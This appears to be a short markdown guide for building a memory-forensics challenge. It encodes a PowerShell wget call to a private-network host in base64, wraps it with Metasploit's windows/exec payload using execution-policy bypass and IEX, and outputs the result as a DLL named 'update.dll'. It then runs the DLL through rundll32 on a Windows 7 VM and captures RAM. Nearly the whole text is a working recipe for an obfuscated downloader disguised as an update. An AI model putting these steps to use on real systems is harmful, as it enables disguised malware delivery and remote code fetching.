# Payload creation

```bash
echo 'powershell.exe "wget  http://192.168.125.250:5000/32c1eb3a605f4006370eb2028f44389552e3507f/Th3W1tchER/Str1Ga; Start-Sleep -s 600"' | base64 -w0

msf> use payload/windows/exec 
msf> set CMD powershell.exe -nop -exec bypass -c "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbC5leGUgIndnZXQgIGh0dHA6Ly8xOTIuMTY4LjEyNS4yNTA6NTAwMC8zMmMxZWIzYTYwNWY0MDA2MzcwZWIyMDI4ZjQ0Mzg5NTUyZTM1MDdmL1RoM1cxdGNoRVIvU3RyMUdhOyBTdGFydC1TbGVlcCAtcyA2MDAiCg==')))" 
msf> generate -f dll -o update.dll
```

# Memory Dump
Upload the update.dll file to a windows 7 machine if you have vagrant install you can use it to spin up a machine.
```bash
vagrant init opensky/windows-7-professional-sp1-x64 --box-version 0.1.0
vagrant up
```

Run the following command to the windows 7 machine and take a RAM capture with [Magnet](https://www.magnetforensics.com/resources/magnet-ram-capture/)

```powershell
C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL update.dll
```

